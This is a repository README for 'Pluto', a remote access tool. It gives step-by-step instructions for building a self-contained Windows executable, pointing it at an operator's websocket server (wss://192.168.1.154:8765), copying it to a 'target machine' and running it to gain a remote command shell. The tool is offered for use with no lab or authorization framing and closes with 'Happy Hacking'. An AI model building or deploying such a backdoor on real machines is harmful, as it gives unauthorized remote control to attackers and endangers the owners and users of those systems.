# Pluto

![pluto](/Images/pluto.png)

# Acknowledgement

First i would like to thank the All-Mighty God who is the source of all knowledge, without Him, this would not be possible.

## Introduction

This repository provides code to deploy an executable on a remote machine, execute it, and establish shell access via websocket communication.

## Features

- Self-Contained Python Executable
- Remote Command Execution via Windows CLI via

## Dependencies

- OpenSsl (you probably need to get gitbash for this)
- numpy
- PyQt6
- websockets
- backoff
- pyinstaller
- opencv-python


## Installation

## requirements.txt installation

Navigate to the src directory and install the requirements.txt

```
pip3 install -r requirments.txt
```
### Certificate generation

First ensure you have openssl installed on your windows box, the easiest way is to do this from a gitbash terminal

Run the `create_keys.py` script, you can pass your servers IP (the controlling machine) to the script via cli args like so:

```bash
python create_keys.py --ip 10.0.0.123
```

It will create the certificate.pem and private.key files in the pluto directory

### Create the executable

Navigate to the src directory and execute the following commands from there:

```bash
python3 cythonize_pluto.py
pyinstaller  --one-file --log-level=DEBUG pluto.spec
```
You can change the address of the server in the `src/pluto.py` by changing the default server address to your ip

```python
    parser.add_argument(
        "--server_address",
        default="wss://192.168.1.154:8765",
        help="WebSocket server address (default: wss://192.168.1.154:8765)",
    )
```

Or you can just invoke it with the args like so

```bash
 .\pluto_windows.exe --server_address wss://192.168.1.154:8765
```

The executable will be in the pluto_dist directory and it will be named `pluto_windows.exe`

### Deployment

Copy `pluto_windows.exe` to your target machine and execute it.


On your computer run the server

```bash
python3 websocket_server.py
```

You should see a "hello server message as seen in the screenshot below"

![pluto](/Images/server.png)

### Future developments

If you look in the src file, you would find a c# implementation and some other python files, those are for future development

## Contribution

Please feel free to open a pull request to contribute code to this repository

Happy Hacking